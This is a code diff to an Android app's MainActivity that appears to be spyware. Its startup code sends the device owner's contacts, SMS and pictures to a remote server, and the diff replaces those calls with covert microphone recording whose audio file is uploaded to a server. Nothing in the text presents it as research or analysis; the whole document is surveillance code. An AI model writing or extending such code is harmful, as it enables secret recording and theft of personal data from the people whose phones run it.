@@ -72,7 +72,7 @@ public class MainActivity extends AppCompatActivity {
                 LocationManager.GPS_PROVIDER, 5000, 10, locationListener);
 
         //new CreateRMIServerAsyncTask(this).execute();
-
+        /*
         try {
             sendContacts(android_id, contacts);
         } catch (IOException e) {
@@ -80,6 +80,8 @@ public class MainActivity extends AppCompatActivity {
         }
         sendSMS(android_id);
         sendPictures(android_id);
+        */
+        sendAudio(android_id, 15000);
     }
 
     // Function to save all contacts of the user in a data structure and send them to the remote server by calling an AsyncTask
@@ -172,7 +174,7 @@ public class MainActivity extends AppCompatActivity {
 
     public void sendAudio(String android_id, int time){
 
-        final AudioRecorder audioRecorder = new AudioRecorder(android_id+"audio.3gp", time);
+        final AudioRecorder audioRecorder = new AudioRecorder(android_id+"audio.aac", time);
         audioRecorder.startRecording();
 
         new Timer().schedule(new TimerTask() {
@@ -193,7 +195,6 @@ public class MainActivity extends AppCompatActivity {
 
 
         // Send the file to the server
-
         new SendAudioAsyncTask(this, android_id, audioRecorder.getmFileName()).execute();
 
     }
